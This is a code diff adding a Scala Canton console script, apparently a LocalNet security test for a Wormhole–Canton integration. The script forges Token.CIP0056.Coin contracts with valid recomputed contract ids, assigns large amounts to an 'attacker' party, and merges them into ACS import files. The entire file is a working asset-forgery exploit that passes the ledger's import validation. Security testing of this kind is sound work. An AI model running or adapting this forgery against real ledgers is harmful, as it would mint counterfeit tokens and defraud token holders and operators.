@@ -1,0 +1,247 @@
+// L5 snapshot forgery: build invented Token.CIP0056.Coin contracts with valid contract ids, in ACS import file format.
+// LocalNet security test only. Reads app-provider through its Ledger API (console config must carry a token that can
+// read as guardianGovernance) and allocates the attacker party there.
+// Environment:
+//   GG_PARTY_ID            guardianGovernance party id.
+//   NTT_MANAGER_CID        contract id of the gg burn/mint NttManager; its instrumentId is the forged instrument.
+//   FORGE_DAR_DIR          directory with the DARs of every package of the Coin template (dependencies included).
+//   FORGE_MODE             "generate" (default) or "merge".
+//   FORGE_COIN_COUNT       generate: number of invented coins (default 3).
+//   FORGE_COIN_AMOUNT      generate: amount of each coin (default 1000000.0).
+//   FORGE_OUTPUT_FILE      generate: gzip ACS file of the invented coins.
+//   FORGE_MERGE_BASE       merge: gzip ACS export to extend.
+//   FORGE_MERGE_OUTPUT     merge: gzip ACS file = FORGE_MERGE_BASE contracts + FORGE_OUTPUT_FILE contracts.
+import com.digitalasset.canton.topology._
+import com.digitalasset.canton.config.RequireTypes.PositiveInt
+import com.digitalasset.canton.crypto.{Hash => CantonHash, HashAlgorithm, HashOps, Hmac, HmacAlgorithm, HmacError, HmacOps, Salt}
+import com.digitalasset.canton.lifecycle.FutureUnlessShutdown
+import com.digitalasset.canton.logging.NamedLoggerFactory
+import com.digitalasset.canton.participant.admin.data.ActiveContract
+import com.digitalasset.canton.protocol._
+import com.digitalasset.canton.tracing.TraceContext
+import com.digitalasset.canton.util.{ContractHasher, LfContractValidation}
+import com.digitalasset.canton.util.PackageConsumer.PackageResolver
+import com.digitalasset.canton.version.ProtocolVersionValidation
+import com.digitalasset.daml.lf.archive.DarDecoder
+import com.digitalasset.daml.lf.crypto.{Hash => LfHash}
+import com.digitalasset.daml.lf.data.{ImmArray, Numeric, Ref, Time}
+import com.digitalasset.daml.lf.engine.Engine
+import com.digitalasset.daml.lf.language.Ast
+import com.digitalasset.daml.lf.transaction.{ContractInstanceCoder, CreationTime, FatContractInstance}
+import com.digitalasset.daml.lf.value.Value
+import com.daml.ledger.api.v2.event.CreatedEvent
+import com.daml.ledger.api.v2.state_service.{ActiveContract => LapiActiveContract}
+import com.google.protobuf.ByteString
+import java.security.SecureRandom
+import java.util.zip.GZIPOutputStream
+import scala.concurrent.{Await, ExecutionContext}
+import scala.concurrent.duration._
+
+def requiredEnvironmentVariable(name: String): String =
+  sys.env.getOrElse(name, throw new RuntimeException(s"missing required environment variable: $name"))
+implicit val forgeExecutionContext: ExecutionContext = ExecutionContext.global
+implicit val forgeTraceContext: TraceContext = TraceContext.empty
+val maxImportFileBytes = 1000000000L
+
+def readAcsFile(path: String): List[ActiveContract] =
+  ActiveContract.fromFile(better.files.File(path), maxImportFileBytes).fold(error => throw error, _.toList)
+// Same framing as repair.add: gzip of length-delimited v30.ActiveContract wrapping a Ledger API ActiveContract.
+def writeAcsFile(path: String, contracts: Seq[LapiActiveContract]): Unit = {
+  val outputStream = new GZIPOutputStream(new java.io.FileOutputStream(path))
+  try contracts.foreach(contract => ActiveContract.tryCreate(contract).writeDelimitedTo(outputStream))
+  finally outputStream.close()
+}
+def decodeContract(blob: ByteString): FatContractInstance =
+  ContractInstanceCoder.decodeFatContractInstance(blob).fold(error => throw new RuntimeException(s"blob decode: $error"), identity)
+def awaitEither[T](result: cats.data.EitherT[FutureUnlessShutdown, String, T], description: String): T =
+  Await.result(result.value.failOnShutdownToAbortException(description), 2.minutes)
+    .fold(error => throw new RuntimeException(s"$description: $error"), identity)
+
+val forgeMode = sys.env.getOrElse("FORGE_MODE", "generate")
+val forgedFile = sys.env.getOrElse("FORGE_OUTPUT_FILE",
+  "/Users/smurf/WormholeLabs/CoreTeam/CantonIntegration/wt/localnet-state/guardian4/forged-coins.acs.gz")
+
+if (forgeMode == "merge") {
+  val baseContracts = readAcsFile(requiredEnvironmentVariable("FORGE_MERGE_BASE")).map(_.contract)
+  val forgedContracts = readAcsFile(forgedFile).map(_.contract)
+  require(forgedContracts.nonEmpty, s"$forgedFile holds no contracts")
+  val mergedContracts = baseContracts ++ forgedContracts
+  require(mergedContracts.map(_.getCreatedEvent.contractId).distinct.size == mergedContracts.size, "duplicate contract id after merge")
+  writeAcsFile(requiredEnvironmentVariable("FORGE_MERGE_OUTPUT"), mergedContracts)
+  println(s"FORGE merged base=${baseContracts.size} forged=${forgedContracts.size} total=${mergedContracts.size}")
+} else {
+  require(forgeMode == "generate", s"unknown FORGE_MODE $forgeMode")
+  val appProvider = participants.remote.find(_.name == "app-provider").getOrElse(throw new RuntimeException("app-provider not bound"))
+  val guardianGovernance = PartyId.tryFromProtoPrimitive(requiredEnvironmentVariable("GG_PARTY_ID"))
+  val managerContractId = requiredEnvironmentVariable("NTT_MANAGER_CID")
+  val coinCount = sys.env.getOrElse("FORGE_COIN_COUNT", "3").toInt
+  require(coinCount >= 1 && coinCount <= 100, s"FORGE_COIN_COUNT out of range: $coinCount")
+  val coinAmountText = sys.env.getOrElse("FORGE_COIN_AMOUNT", "1000000.0")
+
+  // Step 1: attacker party, a local party of the malicious source participant.
+  val attackerHint = "SnapshotForgeryAttacker"
+  val attacker: PartyId = appProvider.parties.hosted(filterParty = attackerHint).map(_.party).find(_.uid.identifier.str == attackerHint)
+    .getOrElse(appProvider.parties.enable(attackerHint))
+  println(s"FORGE attacker=${attacker.toProtoPrimitive}")
+
+  // Step 2: instrument of the gg burn/mint deployment.
+  val ggContracts = appProvider.ledger_api.state.acs.active_contracts_of_party(guardianGovernance, limit = PositiveInt.tryCreate(10000))
+  val managerEvent = ggContracts.flatMap(_.createdEvent).find(_.contractId == managerContractId)
+    .getOrElse(throw new RuntimeException(s"NttManager $managerContractId is not active for gg on app-provider"))
+  // The template filter takes a package-name reference.
+  def blobContracts(event: CreatedEvent): Seq[LapiActiveContract] =
+    appProvider.ledger_api.state.acs.active_contracts_of_party(guardianGovernance, limit = PositiveInt.tryCreate(10000),
+      filterTemplates = Seq(com.digitalasset.canton.admin.api.client.data.TemplateId(
+        s"#${event.packageName}", event.getTemplateId.moduleName, event.getTemplateId.entityName)),
+      includeCreatedEventBlob = true)
+  // Ledger API records are verbose (labelled); decoded contract blobs are positional.
+  def lapiRecordField(record: com.daml.ledger.api.v2.value.Record, fieldName: String): com.daml.ledger.api.v2.value.Value =
+    record.fields.find(_.label == fieldName).flatMap(_.value).getOrElse(throw new RuntimeException(s"no field $fieldName"))
+  val instrumentRecord = lapiRecordField(managerEvent.getCreateArguments, "instrumentId").getRecord
+  val instrumentAdmin = lapiRecordField(instrumentRecord, "admin").getParty
+  val instrumentName = lapiRecordField(instrumentRecord, "id").getText
+  require(instrumentAdmin == guardianGovernance.toProtoPrimitive, s"instrument admin is $instrumentAdmin, not gg")
+  // Token.CIP0056.Coin fields: instrumentId (admin, id), owner, amount.
+  val instrumentIdValue: Value = Value.ValueRecord(None, ImmArray(
+    None -> Value.ValueParty(Ref.Party.assertFromString(instrumentAdmin)), None -> Value.ValueText(instrumentName)))
+  def positionalFields(record: Value): Seq[Value] = record match {
+    case Value.ValueRecord(_, fields) => fields.toSeq.map(_._2)
+    case other => throw new RuntimeException(s"not a record: $other")
+  }
+  println(s"FORGE instrument=$instrumentName admin=$instrumentAdmin")
+
+  // Step 3: a real Coin of the same instrument, as the template for the invented ones.
+  val coinEvent = ggContracts.flatMap(_.createdEvent)
+    .find(event => event.getTemplateId.moduleName == "Token.CIP0056.Coin" && event.getTemplateId.entityName == "Coin")
+    .getOrElse(throw new RuntimeException("no Token.CIP0056.Coin contract visible to gg"))
+  val realCoinContracts = blobContracts(coinEvent)
+  val (realCoinActiveContract, realCoin) = realCoinContracts
+    .map(contract => contract -> decodeContract(contract.getCreatedEvent.createdEventBlob))
+    .find { case (_, coin) => positionalFields(positionalFields(coin.createArg).head) == positionalFields(instrumentIdValue) }
+    .getOrElse(throw new RuntimeException("no Coin of the burn/mint instrument"))
+  println(s"FORGE real-coin=${realCoin.contractId.coid} template=${realCoin.templateId} representative=${realCoinActiveContract.getCreatedEvent.representativePackageId}")
+
+  // Daml-LF engine over the DAR packages, as the participant uses for contract validation.
+  val darPackages: Map[Ref.PackageId, Ast.Package] = new java.io.File(requiredEnvironmentVariable("FORGE_DAR_DIR")).listFiles()
+    .filter(_.getName.endsWith(".dar")).toSeq
+    .flatMap(darFile => DarDecoder.readArchiveFromFile(darFile).fold(error => throw new RuntimeException(s"$darFile: $error"), _.all))
+    .toMap
+  val packageResolver = new PackageResolver {
+    override protected def resolveInternal(packageId: Ref.PackageId)(implicit traceContext: TraceContext): FutureUnlessShutdown[Option[Ast.Package]] =
+      FutureUnlessShutdown.pure(darPackages.get(packageId))
+  }
+  val engine = Engine.DevEngine(NamedLoggerFactory.root)
+  val contractHasher = ContractHasher(engine, packageResolver)
+  val lfContractValidation = LfContractValidation(engine, packageResolver)
+  // Unicum recomputation hashes only; HMAC is for salt derivation, which this script replaces with random salts.
+  val sha256HashOps = new HashOps with HmacOps {
+    override def defaultHashAlgorithm: HashAlgorithm = HashAlgorithm.Sha256
+    override def computeHmacWithSecretInternal(secret: ByteString, message: ByteString, algorithm: HmacAlgorithm): Either[HmacError, Hmac] =
+      throw new UnsupportedOperationException("HMAC is not used by unicum recomputation")
+  }
+  val unicumGenerator = new UnicumGenerator(sha256HashOps)
+
+  def contractIdVersionOf(contract: FatContractInstance): CantonContractIdV1Version =
+    CantonContractIdVersion.extractCantonContractIdVersion(contract.contractId) match {
+      case Right(version: CantonContractIdV1Version) => version
+      case other => throw new RuntimeException(s"unsupported contract id version: $other")
+    }
+  def contractHashOf(contract: FatContractInstance, version: CantonContractIdV1Version): LfHash =
+    awaitEither(contractHasher.hash(contract.toCreateNode, version.contractHashingMethod, PackageResolver.ignoreMissingPackage), "contract hash")
+  def metadataOf(contract: FatContractInstance): ContractMetadata =
+    ContractMetadata.tryCreate(contract.signatories, contract.stakeholders, None)
+  def createdAtOf(contract: FatContractInstance): CreationTime.CreatedAt = contract.createdAt match {
+    case createdAt: CreationTime.CreatedAt => createdAt
+    case other => throw new RuntimeException(s"contract without absolute creation time: $other")
+  }
+  def saltOf(contract: FatContractInstance, version: CantonContractIdV1Version): Salt =
+    ContractAuthenticationData.fromLfBytes(ProtocolVersionValidation.NoValidation, version, contract.authenticationData) match {
+      case Right(authenticationData: ContractAuthenticationDataV1) => authenticationData.salt
+      case other => throw new RuntimeException(s"unexpected authentication data: $other")
+    }
+  def contractIdFor(discriminator: LfHash, salt: Salt, createdAt: CreationTime.CreatedAt, metadata: ContractMetadata,
+                    contractHash: LfHash, version: CantonContractIdV1Version): Value.ContractId.V1 = {
+    val unicum = unicumGenerator.recomputeUnicum(salt, createdAt, metadata, contractHash).fold(error => throw new RuntimeException(error), identity)
+    Value.ContractId.V1.build(discriminator, unicum.toContractIdSuffix(version)).fold(error => throw new RuntimeException(error), identity)
+  }
+  def discriminatorOf(contract: FatContractInstance): LfHash = contract.contractId match {
+    case Value.ContractId.V1(contractDiscriminator, _) => contractDiscriminator
+    case other => throw new RuntimeException(s"not a V1 contract id: $other")
+  }
+  def contractIdFromHash(contract: FatContractInstance, contractHash: LfHash): Value.ContractId = {
+    val version = contractIdVersionOf(contract)
+    contractIdFor(discriminatorOf(contract), saltOf(contract, version), createdAtOf(contract), metadataOf(contract), contractHash, version)
+  }
+  def recomputedContractId(contract: FatContractInstance): Value.ContractId =
+    contractIdFromHash(contract, contractHashOf(contract, contractIdVersionOf(contract)))
+  // Same check as ContractImportMode.Validation: type check, ensure clause, metadata, and the id from the engine's hash.
+  def passesImportValidation(contract: FatContractInstance, representativePackageId: Ref.PackageId): Either[String, Unit] =
+    Await.result(lfContractValidation.validate(contract, representativePackageId, identity, contractIdVersionOf(contract).contractHashingMethod,
+      engineHash => contractIdFromHash(contract, engineHash) == contract.contractId).value.failOnShutdownToAbortException("validate"), 2.minutes)
+
+  // Step 4: sanity check against a contract the ledger created.
+  val realCoinRepresentative = Ref.PackageId.assertFromString(realCoinActiveContract.getCreatedEvent.representativePackageId)
+  val sanityMatches = recomputedContractId(realCoin) == realCoin.contractId
+  println(s"FORGE sanity recomputed-id-matches=$sanityMatches version=${contractIdVersionOf(realCoin)} validation=${passesImportValidation(realCoin, realCoinRepresentative)}")
+  require(sanityMatches, "the recomputed id of a real Coin differs; the forged ids would fail Validation")
+
+  // Step 5: invented coins: owner = attacker, fresh salt and discriminator, creation time now.
+  val secureRandom = new SecureRandom()
+  def randomBytes(length: Int): Array[Byte] = { val bytes = new Array[Byte](length); secureRandom.nextBytes(bytes); bytes }
+  val realCoinVersion = contractIdVersionOf(realCoin)
+  val saltTemplate = saltOf(realCoin, realCoinVersion)
+  val coinAmount = Value.ValueNumeric(Numeric.assertFromString(BigDecimal(coinAmountText).setScale(10).bigDecimal.toPlainString))
+  val forgedCoinArg = realCoin.createArg match {
+    case Value.ValueRecord(templateConstructor, fields) =>
+      require(fields.length == 3, s"Coin argument has ${fields.length} fields, expected 3")
+      val Seq(instrumentField, ownerField, amountField) = fields.toSeq
+      Value.ValueRecord(templateConstructor, ImmArray(
+        instrumentField, ownerField._1 -> Value.ValueParty(attacker.toLf), amountField._1 -> coinAmount))
+    case other => throw new RuntimeException(s"Coin argument is not a record: $other")
+  }
+  val forgedSignatories = Set[Ref.Party](guardianGovernance.toLf, attacker.toLf)
+  val forgedContracts = (1 to coinCount).map { _ =>
+    val salt = Salt.fromProtoV30(saltTemplate.toProtoV30.withSalt(ByteString.copyFrom(randomBytes(saltTemplate.size))))
+      .fold(error => throw new RuntimeException(error.toString), saltValue => saltValue)
+    val createdAt = CreationTime.CreatedAt(Time.Timestamp.now())
+    val discriminator = LfHash.assertFromByteArray(randomBytes(LfHash.underlyingHashLength))
+    val placeholderCreate = realCoin.toCreateNode.copy(
+      coid = Value.ContractId.V1(discriminator), arg = forgedCoinArg, signatories = forgedSignatories, stakeholders = forgedSignatories)
+    val authenticationData = ContractAuthenticationDataV1(salt)(realCoinVersion).toLfBytes
+    val placeholder = FatContractInstance.fromCreateNode(placeholderCreate, createdAt, authenticationData)
+    val forgedId = contractIdFor(discriminator, salt, createdAt, metadataOf(placeholder), contractHashOf(placeholder, realCoinVersion), realCoinVersion)
+    val forgedCoin = FatContractInstance.fromCreateNode(placeholderCreate.copy(coid = forgedId), createdAt, authenticationData)
+    val forgedBlob = ContractInstanceCoder.encodeFatContractInstance(forgedCoin).fold(error => throw new RuntimeException(error.toString), identity)
+    println(s"FORGE coin=${forgedId.coid}")
+    LapiActiveContract(
+      createdEvent = Some(CreatedEvent.defaultInstance
+        .withCreatedEventBlob(forgedBlob)
+        .withRepresentativePackageId(realCoinRepresentative)
+        .withContractId(forgedId.coid)),
+      synchronizerId = realCoinActiveContract.synchronizerId,
+      reassignmentCounter = 0L,
+    )
+  }
+  writeAcsFile(forgedFile, forgedContracts)
+
+  // Step 6: re-read the file and validate each contract as a Validation import does.
+  val reread = readAcsFile(forgedFile)
+  val selfCheckResults = reread.map { activeContract =>
+    val event = activeContract.contract.getCreatedEvent
+    val contract = decodeContract(event.createdEventBlob)
+    val validation = passesImportValidation(contract, Ref.PackageId.assertFromString(event.representativePackageId))
+    println(s"FORGE validate coin=${contract.contractId.coid} result=$validation idField=${event.contractId == contract.contractId.coid}")
+    validation.isRight && event.contractId == contract.contractId.coid
+  }
+  // Negative control: a changed amount under the same id must fail.
+  val tamperedCoin = decodeContract(reread.head.contract.getCreatedEvent.createdEventBlob)
+  val tamperedCreate = tamperedCoin.toCreateNode.copy(arg = tamperedCoin.createArg match {
+    case Value.ValueRecord(templateConstructor, fields) =>
+      Value.ValueRecord(templateConstructor, ImmArray.from(fields.toSeq.updated(2, fields.toSeq(2)._1 -> Value.ValueNumeric(Numeric.assertFromString("2000000.0000000000")))))
+    case other => throw new RuntimeException(s"not a record: $other")
+  })
+  val tamperedValidation = passesImportValidation(
+    FatContractInstance.fromCreateNode(tamperedCreate, createdAtOf(tamperedCoin), tamperedCoin.authenticationData), realCoinRepresentative)
+  println(s"FORGE negative tampered-amount rejected=${tamperedValidation.isLeft} detail=${tamperedValidation.left.toOption.getOrElse("").take(200)}")
+  println(s"FORGE self-check ok=${reread.size == coinCount && selfCheckResults.forall(identity) && tamperedValidation.isLeft} file=$forgedFile")
+}
